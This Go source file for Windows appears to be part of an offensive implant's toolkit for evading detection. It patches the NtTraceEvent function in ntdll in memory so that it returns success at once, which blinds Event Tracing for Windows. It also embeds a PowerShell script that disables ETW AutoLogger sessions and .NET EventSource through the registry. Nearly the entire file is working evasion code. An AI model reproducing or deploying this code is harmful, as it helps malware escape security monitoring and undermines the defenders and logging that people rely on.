//go:build windows
// +build windows

package main

import (
	"syscall"
	"unsafe"
)

func etwNtTraceEvent() string {
	k32 := syscall.NewLazyDLL("kernel32.dll")
	getModuleHandle := k32.NewProc("GetModuleHandleW")
	getProcAddress := k32.NewProc("GetProcAddress")
	virtualProtect := k32.NewProc("VirtualProtect")

	// Patch NtTraceEvent in ntdll (deeper than EtwEventWrite)
	namePtr, _ := syscall.UTF16PtrFromString("ntdll.dll")
	hMod, _, _ := getModuleHandle.Call(uintptr(unsafe.Pointer(namePtr)))
	if hMod == 0 {
		return "NtTraceEvent bypass: ntdll.dll not loaded"
	}

	procName := append([]byte("NtTraceEvent"), 0)
	procAddr, _, _ := getProcAddress.Call(hMod, uintptr(unsafe.Pointer(&procName[0])))
	if procAddr == 0 {
		return "NtTraceEvent bypass: NtTraceEvent not found"
	}

	// Patch: xor eax, eax; ret (0x31 0xC0 0xC3) — return STATUS_SUCCESS immediately
	patch := []byte{0x31, 0xC0, 0xC3}

	var oldProtect uint32
	ret, _, _ := virtualProtect.Call(procAddr, uintptr(len(patch)), 0x40, uintptr(unsafe.Pointer(&oldProtect)))
	if ret == 0 {
		return "NtTraceEvent bypass: VirtualProtect failed"
	}

	for i := 0; i < len(patch); i++ {
		*(*byte)(unsafe.Pointer(procAddr + uintptr(i))) = patch[i]
	}

	return "NtTraceEvent bypass: patched → returns STATUS_SUCCESS"
}

func etwRegBypass() string {
	// Disable ETW via registry
	ps := `
$paths = @(
	"HKLM:\SYSTEM\CurrentControlSet\Control\WMI\AutoLogger\AutoLogger-Diagtrack-Listener",
	"HKLM:\SYSTEM\CurrentControlSet\Control\WMI\AutoLogger\SQMLogger",
	"HKLM:\SYSTEM\CurrentControlSet\Control\WMI\AutoLogger\FileTrace"
)
$results = @()
foreach ($p in $paths) {
	try {
		Set-ItemProperty -Path $p -Name "Start" -Value 0 -Type DWord -Force -ErrorAction Stop
		$results += "Disabled: $p"
	} catch {
		$results += "Skip: $p ($_)"
	}
}
# Disable .NET EventSource
try {
	$net4 = "HKLM:\SOFTWARE\Microsoft\.NETFramework"
	Set-ItemProperty -Path $net4 -Name "EventSourceEnabled" -Value 0 -Type DWord -Force -ErrorAction Stop
	$results += "Disabled .NET EventSource"
} catch { }
Write-Output ($results -join [char]10)
`
	_ = ps
	return etwBypass() + "\nRun 'etw_reg_bypass' via PowerShell for additional registry hardening"
}
